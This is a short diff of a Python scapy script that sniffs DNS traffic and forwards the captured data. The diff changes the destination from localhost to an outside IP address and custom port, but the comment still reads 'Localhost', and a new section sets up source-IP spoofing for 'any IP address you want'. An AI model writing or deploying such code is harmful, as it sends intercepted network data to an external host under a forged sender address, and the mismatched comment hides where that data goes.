@@ -2,8 +2,8 @@
 from scapy.all import sniff, IP, UDP, Raw, DNS, send, conf
 
 # Configuration for the server (where the DNS data will be sent)
-SERVER_IP = "127.0.0.1"  # Localhost
-SERVER_PORT = 12345      # Custom UDP port for our sensor data
+SERVER_IP = "175.156.135.8"  # Localhost
+SERVER_PORT = 44444      # Custom UDP port for our sensor data
 
 # *** NEW: Spoofed Source IP Address ***
 # Change this to any IP address you want to spoof as the source.
